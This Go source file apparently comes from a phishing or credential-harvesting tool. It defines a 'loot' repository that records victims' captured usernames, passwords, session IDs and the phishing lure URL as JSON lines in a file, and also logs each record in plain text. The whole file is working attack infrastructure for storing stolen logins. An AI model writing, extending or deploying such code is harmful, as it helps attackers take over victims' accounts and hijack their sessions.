package main

import (
	"encoding/json"
	"io"
	"log"
	"sync"
	"time"
)

type DBLoginInfo struct {
	Username  string    `json:"username"`
	Password  string    `json:"password"`
	Date      time.Time `json:"date"`
	SessionID string    `json:"sid"`
	LureURL   string    `json:"lure_url"`
}
type LootRepository interface {
	SaveCreds(info *DBLoginInfo) error
}

func NewFileLootRepository(credsFile io.Writer) LootRepository {
	return &fileLootRepository{credsFile: credsFile}
}

type fileLootRepository struct {
	credsFile io.Writer
	mu        sync.Mutex
}

func (r *fileLootRepository) SaveCreds(info *DBLoginInfo) (err error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	log.Println("dbInfo = ", info)
	data, err := json.Marshal(info)
	if err != nil {
		return err
	}
	if _, err = r.credsFile.Write(data); err != nil {
		return
	}
	_, err = r.credsFile.Write([]byte("\n"))
	return
}
